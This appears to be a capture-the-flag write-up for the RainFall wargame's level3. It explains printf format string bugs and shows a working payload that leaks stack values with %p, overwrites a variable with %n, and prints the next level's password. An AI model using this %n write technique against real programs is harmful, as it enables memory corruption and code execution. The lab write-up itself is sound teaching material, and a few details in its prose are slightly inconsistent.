### Exploit

This level introduces format string vulnerabilities. Format string vulnerabilities are a pretty silly class of bug that take 
advantage of an easily avoidable programmer error. If the programmer passes an attacker-controlled buffer as the argument 
to a `printf`, the attacker can perform writes to arbitrary memory addresses. Since printf has a variable number of arguments,
it must use the format string to determine the number of arguments. In the case above, the attacker can pass the string 
"%p %p %p %p %p %p %p %p" and fool the printf into thinking it has 8 arguments. It will naively print the next 15 addresses on 
the stack, thinking they are its arguments:

```
    level3@RainFall:~$ python -c 'print "\x8c\x98\x49\x80" + "%p %p %p %p %p %p %p %p"' | ./level3
    ��I�0x200 0xb7fd1ac0 0xb7ff37d0 0x8049988c 0x25207025 0x70252070 0x20702520 0x25207025
    level3@RainFall:~$ python -c 'print "\x8c\x98\x49\x80" + "AAAA%5$p"' | ./level3
    ��I�AAAA0x41414141
```
At about 4 arguments up the stack, we can see a repeating pattern of 0x25207025- those are our _%p_ on the stack! In C printf(),
%n is a special format specifier which instead of printing something causes printf() to load the variable pointed by the 
corresponding argument with a value equal to the number of characters that have been printed by printf() before the occurrence 
of %n. 

```
    level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + 'A'*60 + '%4\$n'" > /tmp/payload
    level3@RainFall:~$ cat /tmp/payload - | ./level3
    �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Wait what?!
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

Spoiler alert: the next couple of levels also involve format string exploits... You've been warned!
